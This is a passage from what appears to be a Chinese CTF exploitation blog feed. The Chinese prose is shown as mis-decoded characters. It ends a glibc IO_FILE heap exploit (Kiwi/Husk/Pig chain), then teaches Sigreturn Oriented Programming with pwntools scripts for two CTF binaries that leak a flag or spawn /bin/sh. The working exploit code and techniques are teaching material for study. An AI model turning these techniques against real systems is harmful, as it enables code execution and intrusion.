class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(system_addr) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>bin_sh_addr = heap_base + <span class="hljs-number">0xA00</span><br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64((bin_sh_addr - <span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Exp-House-of-Corrosion"><a class="header-anchor" href="#Exp-House-of-Corrosion">Â¶</a>Exp.House of Corrosion</h3><h1>å‚è€ƒèµ„æ–™</h1><p><a href="https://fmyy.pro/">è‚¥çŒ«å˜¤å˜¤â€™s blog</a></p><p><a href="https://www.anquanke.com/post/id/202387">house-of-huskå­¦ä¹ ç¬”è®°</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop">raycp å¸ˆå‚…çš„ _IO_FILE ç³»åˆ—æ–‡ç« </a></p><p><a href="https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie">_IO_FILEåˆ©ç”¨æ€è·¯æ€»ç»“ - b0ldfrev</a></p><p><a href="https://bbs.pediy.com/thread-272098.htm">CTF ä¸­ glibcå †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“ - winmt</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/posts/341e3484.html"/>
    <url>/posts/341e3484.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ„Ÿè§‰åˆ°éš¾å¤§æ¦‚æ˜¯å› ä¸ºè¿˜æ²¡å­¦ä¼šç½¢ï¼Œæ„¿åœ¨æŒæ¡ä¹‹åå†å›å¤´çœ‹èƒ½çœ‹åˆ°ä¸ä¸€æ ·çš„é£æ™¯ã€‚</p></blockquote><h1>SROP(Sigreturn Oriented Programming)</h1><h2 id="ç†è§£"><a class="header-anchor" href="#ç†è§£">Â¶</a>ç†è§£</h2><p>ç½‘ä¸Šå¾ˆå¤šå¤§ä½¬åŸç†å†™çš„å¾ˆå¥½äº†ï¼Œæˆ‘è¿™é‡Œå°±å†™ç‚¹è‡ªå·±æƒ³æ³•ã€‚</p><p>é¦–å…ˆäº†è§£ä¸€ä¸‹ï¼Œsignal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/ProcessOfSignalHandlering.png" alt=""></p><p>ä½ ä¸æ‡‚æ²¡å…³ç³»ï¼ˆ<s>æˆ‘ä¹Ÿä¸æ‡‚</s>ï¼‰ï¼Œç®€å•æ¥è¯´ä½ å‘é€ signal çš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠä½ çš„å¯„å­˜å™¨å’Œ signal ä¿¡æ¯å­˜åˆ°ä½ çš„ç”¨æˆ·æ ˆé‡Œï¼Œç„¶åè·³åˆ°å†…æ ¸æ€å»å¤„ç† signalï¼Œå†…æ ¸è¿”å›ç”¨æˆ·æ€æ‰§è¡Œä¿¡å·å¤„ç†ä¹‹å‰ï¼Œä¼šè®¾ç½®ä¿¡å·å¤„ç†å‡½æ•°çš„è¿”å›åœ°å€(x30)æŒ‡å‘[vdso]ä¸­çš„ <strong>__kernel_rt_sigreturn</strong> å‡½æ•°ï¼Œæ¥ä»æ ˆä¸­æ¢å¤å–å‡ºä¹‹å‰æ‰€å­˜çš„ä¿¡æ¯ï¼ˆ<strong>æ— æ£€éªŒ</strong>ï¼‰ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ã€‚æˆ‘ä»¬è‡ªå·±å†™ä¸€ç³»åˆ—ç²¾å¿ƒæ„é€ çš„æ•°æ®ï¼Œä¼ªè£…æˆæˆ‘ä»¬çš„å¯„å­˜å™¨å’Œ signal ä¿¡æ¯ï¼Œç„¶åå…ˆæŠŠè¿”å›åœ°å€è¦†ç›–æˆ <strong>Sigreturn</strong> ï¼Œåé¢ç´§è·Ÿç€æˆ‘ä»¬è‡ªå·±æ„é€ å¥½çš„å¯„å­˜å™¨å’Œ signal ä¿¡æ¯ï¼Œç›¸å½“äºæˆ‘ä»¬æ¶æ„åˆ©ç”¨äº†è¿™ä¸ªæ¢å¤æœºåˆ¶ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶ rip rsp åœ¨å†…çš„æ‰€æœ‰å¯„å­˜å™¨ï¼Œé‚£ä¹ˆè‡ªç„¶å°±å¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œäº†ã€‚</p><p>è¿›ä¸€æ­¥ï¼Œå¦‚æœçŸ¥é“ <code>/bin/sh</code> çš„åœ°å€ï¼Œå­˜åœ¨ syscall ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å¦‚ä¸‹æ„é€ å°±å¯ä»¥ getshell ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/srop-example-1.png" alt=""></p><p>ä½†ä¸€èˆ¬ç¨‹åºæ˜¯ä¸ä¼šç›´æ¥ç»™ä½  <code>/bin/sh</code> çš„ï¼Œä½ éœ€è¦è‡ªå·±é€šè¿‡ read å¾€æŸä¸ªåœ°å€å†™ã€‚è¿™å°±éœ€è¦æ„é€  SROP é“¾ï¼ˆå…³é”®gadgetï¼š<code>syscall;ret</code>ï¼‰ï¼Œå…·ä½“çš„æˆ‘ä»¬ä¸‹é¢çœ‹å‡ ä¸ªé¢˜ã€‚</p><hr><h2 id="åˆ©ç”¨å‰æ"><a class="header-anchor" href="#åˆ©ç”¨å‰æ">Â¶</a>åˆ©ç”¨å‰æ</h2><p>å¤§æ¦‚æ˜¯ï¼š</p><ol><li>syscallï¼Œsignal æ²¡ syscall ğŸ‘¦ ç©æ¯› ã€‚</li><li>è¶³å¤Ÿå¤§çš„æº¢å‡ºç©ºé—´ï¼Œè¦èƒ½æ”¾å¾—ä¸‹ä¼ªé€ çš„ Frameã€‚</li><li>å¥½ç”¨çš„ gadget ï¼ˆéå¿…è¦,è¯¦è§ <code>smallest</code>ï¼‰ï¼Œæ¯”å¦‚ pop rax ä¹‹ç±»çš„ï¼Œå°±ç®—æ²¡æœ‰ <strong>Sigreturn</strong> ï¼Œx64 ä¸‹æŠŠ rax è°ƒåˆ° 15 åæ‰§è¡Œ syscall æ˜¯ä¸€æ ·çš„æ•ˆæœã€‚</li></ol><p>ä¸€èˆ¬æ€è·¯æ˜¯æƒ³åŠæ³•æåˆ° <code>/bin/sh</code> çš„ä½ç½®ï¼ˆæ²¡æœ‰å°±å†™ä¸€ä¸ªï¼‰ååˆ©ç”¨ SROP æ‰§è¡Œ execve ï¼Œå…¶ä»–çš„æˆ‘ä¸å¥½è¯´ï¼Œç›´æ¥çœ‹é¢˜å§ã€‚</p><hr><h2 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h2><p>é¢ï¼Œå¤§æ¦‚æ˜¯ä»æ˜“åˆ°éš¾å§ã€‚åé¢è¦æ˜¯è¿½åŠ å°±ä¸ç®—äº†ã€‚</p><h3 id="FUNSIGNALSï¼ˆç™½ç»™çš„-Sigreturnï¼‰"><a class="header-anchor" href="#FUNSIGNALSï¼ˆç™½ç»™çš„-Sigreturnï¼‰">Â¶</a>FUNSIGNALSï¼ˆç™½ç»™çš„ Sigreturnï¼‰</h3><h4 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h4><p>ä¸¢åˆ° IDA é‡Œé¢å»ï¼Œå•çº¯çš„ SROP é¢˜ç›®éƒ½æ˜¯æ¯”è¾ƒç®€æ´çš„ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329111928988.png" alt="image-20220329111928988"></p><p>é¦–å…ˆè¦çœ‹æ‡‚è¿™ä¸ªç¨‹åºï¼š</p><ol><li><code>mov dh, 4</code> çš„æ„æ€åœ¨è¿™é‡Œæ˜¯ <code>RDX = 0x400</code>ï¼Œä¸æ¸…æ¥šçš„è¯å¯ä»¥å» gdb ä¸‹æ–­ç‚¹åæŒ‰ r å†è·‘ä¸€éè‡ªå·±éªŒè¯ã€‚`</li><li>å¼€å¤´åˆ°ç¬¬ä¸€ä¸ª syscall æ„æ€å°±æ˜¯åœ¨ rsp çš„åœ°æ–¹è¯»å…¥ 0x400 çš„æ•°æ®ã€‚</li><li>é¢˜ç›®è´´å¿ƒçš„æ˜¯ï¼Œåé¢çš„ <code>push 0xF pop rax syscall</code>ï¼Œç›¸å½“äºç›´æ¥è°ƒç”¨äº† <strong>Sigreturn</strong> äº†ï¼ˆRAX = 15ï¼‰ã€‚åé¢çš„ <code>int 3</code> ä½ ä¸ç”¨ç®¡å®ƒï¼Œæˆ‘ä»¬ Sigreturn çš„æ˜¯è‡ªå·±æ„é€ çš„ Frame ï¼ŒæŠŠ rsp å’Œ rip ğŸ‘ äº†å°±æ²¡å®ƒçš„äº‹äº†ã€‚</li></ol><p>æˆ‘ä»¬è¦å¹²çš„äº‹ä¹Ÿå¾ˆç®€å•ï¼Œç®€å•çš„æ„é€ ä¸€ä¸ªæ¶æ„ Frame ï¼Œç”¨ write å»æ³„éœ²è¿™ä¸ª flag ã€‚ç›´æ¥è°ƒç”¨ pwntools æ„é€ ã€‚</p><h4 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br><br>p = process(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;hack.bckdr.in&#x27;,17002)</span><br>elf = ELF(<span class="hljs-string">&#x27;./FUNSIGNALS&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br>frame=SigreturnFrame()<br>frame.rax = constants.SYS_write <span class="hljs-comment"># 1 is ok</span><br>frame.rdi = constants.STDOUT_FILENO <span class="hljs-comment"># 1 is ok</span><br>frame.rsi = elf.sym[<span class="hljs-string">&#x27;flag&#x27;</span>]<br>frame.rdx = <span class="hljs-number">100</span><br>frame.rip = elf.sym[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br><br>p.sendline(<span class="hljs-built_in">str</span>(frame))<br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 id="rootersctf-2019-sropï¼ˆpop-rax-æ„é€ çš„-Sigreturnï¼‰"><a class="header-anchor" href="#rootersctf-2019-sropï¼ˆpop-rax-æ„é€ çš„-Sigreturnï¼‰">Â¶</a>rootersctf_2019_sropï¼ˆpop rax æ„é€ çš„ Sigreturnï¼‰</h3><h4 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h4><p>ç¨‹åºé€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼šå…ˆè¾“å‡º data æ®µ buf å†…çš„ä¿¡æ¯ï¼Œå¾€ <code>rsp-0x40</code> å¤„å†™å…¥ <code>0x400</code> çš„æ•°æ®ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220329141956305.png" alt="image-20220329141956305"></p><p>è¿™é¢˜æ²¡æœ‰ç™½ç»™çš„ Sigreturn ï¼Œä½†æ˜¯æœ‰ä¸ªå¾ˆå¥½ç”¨çš„ gadget <code>pop rax syscall</code> ã€‚</p><p>åŸºæœ¬æ€è·¯æ˜¯ï¼šç¬¬ä¸€æ¬¡ä¼ªé€  Frame åœ¨å·²çŸ¥åœ°å€å¤„å†™å…¥ <code>/bin/sh</code> ï¼Œç¬¬äºŒæ¬¡ä¼ªé€  Frame è¿›è¡Œä¸€ä¸ª <code>/bin/sh</code> çš„ <code>execve</code> ã€‚</p><p>é¦–å…ˆï¼Œ æ ˆæº¢å‡ºè¦†ç›– rip ä¸º <code>pop rax;syscall;leave;retn</code> è¿™ä¸ª gadgetï¼Œåé¢ç´§è·Ÿ Sigreturn è°ƒç”¨å· 15 å’Œ ç¬¬ä¸€ä¸ªä¼ªé€ çš„ Frameã€‚</p><p>æœ‰å¿…è¦è¯´æ˜ä¸€ä¸‹ Frame å…·ä½“çš„æ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><span class="hljs-comment"># read è°ƒç”¨å·</span><br>fuck.rdi = <span class="hljs-number">0</span><span class="hljs-comment"># fd</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><span class="hljs-comment"># buf</span><br>fuck.rdx = <span class="hljs-number">0x400</span><span class="hljs-comment"># count ä¸è¦å†™å°äº†ï¼Œæ²¡ä½ å¥½æœæ±åƒ(á—œ_á—œï¼‰</span><br>fuck.rip = syscall_ret<span class="hljs-comment"># syscall;leave;retn</span><br>fuck.rsp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss æ®µå·²çŸ¥åœ°å€</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><span class="hljs-comment"># bss æ®µå·²çŸ¥åœ°å€</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬é¢„æœŸä¸­çš„ç¨‹åºæµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><ol><li>Sigreturn æ¢å¤æ¶æ„ Frame åˆ°å¯„å­˜å™¨ ï¼Œç´§æ¥ç€æ‰§è¡Œçš„æ˜¯ Frame ä¸­çš„ rip ä¹Ÿå°±æ˜¯ <code>syscall;leave;ret</code> ï¼Œé‚£ä¹ˆ <code>syscall</code> å°±ä¼šå…ˆåœ¨ <code>0x402500</code> å¤„è¯»å…¥ <code>0x400</code> çš„æ•°æ®ï¼ˆROPé“¾++ï¼‰ã€‚</li><li><code>leave;ret</code> æ„æ€æ˜¯ <code>mov rsp,rbp;pop rbp;pop rip</code> ï¼Œ<code>mov rsp,rbp</code>å› ä¸ºæˆ‘ä»¬æ„é€ çš„æ˜¯ä¸€æ ·çš„åœ°å€æ‰€ä»¥æ²¡å½±å“ï¼Œ<code>pop rbp</code> ä¼šæŠŠæˆ‘ä»¬ ROP é“¾çš„å‰å…«ä¸ªå­—èŠ‚ç»™ ğŸ‘ äº†ã€‚æ‰€ä»¥æˆ‘ä»¬è¦åœ¨ ROP é“¾ä¸Šå…ˆå¡«å…… 8 å­—èŠ‚çš„åƒåœ¾ rbp åœ°å€ï¼Œé‚£ä¹ˆ <code>pop rip</code> æ—¶å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„ ROP é“¾ã€‚ï¼ˆæ˜¯ä¸æ˜¯æ„Ÿè§‰æœ‰ç‚¹æ ˆè¿ç§»é‚£å‘³ğŸ‘¦ï¼‰</li></ol><p>ROP é“¾æˆ‘ä»¬æ˜æ˜¾è¦ç”¨æ¥ä¼ªé€ ç¬¬äºŒä¸ª Frameï¼Œæˆ‘ä»¬åœ¨ <code>0x402500</code> å†™å…¥ ROP é“¾åŒæ—¶æˆ‘ä»¬é¡ºå¸¦å†™ä¸Š <code>/bin/sh\0</code>ï¼Œå…·ä½“çš„ç›´æ¥çœ‹ Exp ã€‚</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./rootersctf_2019_srop&#x27;</span>)<br>debug()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:0000000000401032                 pop     rax</span><br><span class="hljs-string">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="hljs-string">.text:0000000000401035                 leave</span><br><span class="hljs-string">.text:0000000000401036                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rax_syscall_leave_ret = <span class="hljs-number">0x401032</span><br>syscall_ret = <span class="hljs-number">0x401033</span><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">0</span><br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = <span class="hljs-number">0x402500</span><br>fuck.rdx = <span class="hljs-number">0x400</span><br>fuck.rip = syscall_ret<br>fuck.rsp = <span class="hljs-number">0x402500</span><br>fuck.rbp = <span class="hljs-number">0x402500</span><br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>,<span class="hljs-number">0xdeadbeef</span>,rax_syscall_leave_ret,<span class="hljs-number">15</span>,fuck]<br>)<br>sl(payload)<br><br>wsnd = SigreturnFrame()<br>wsnd.rax = <span class="hljs-number">59</span><br>wsnd.rdi = <span class="hljs-number">0x402500</span> + <span class="hljs-number">0x200</span><br>wsnd.rsi = <span class="hljs-number">0</span><br>wsnd.rdx = <span class="hljs-number">0</span><br>wsnd.rip = syscall_ret<br>wsnd.rsp = <span class="hljs-number">0xdeadbeef</span><br>wsnd.rbp = <span class="hljs-number">0xdeadbeef</span><br><span class="hljs-comment"># print(len((p64(0xdeadbeef)+p64(rax_syscall_leave_ret)+p64(15)+str(wsnd))))  !!! 272 !!!</span><br>sl((p64(<span class="hljs-number">0xdeadbeef</span>)+p64(rax_syscall_leave_ret)+p64(<span class="hljs-number">15</span>)+<span class="hljs-built_in">str</span>(wsnd)).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>) <span class="hljs-comment"># bin_sh = 0x402500 + 0x200</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h3 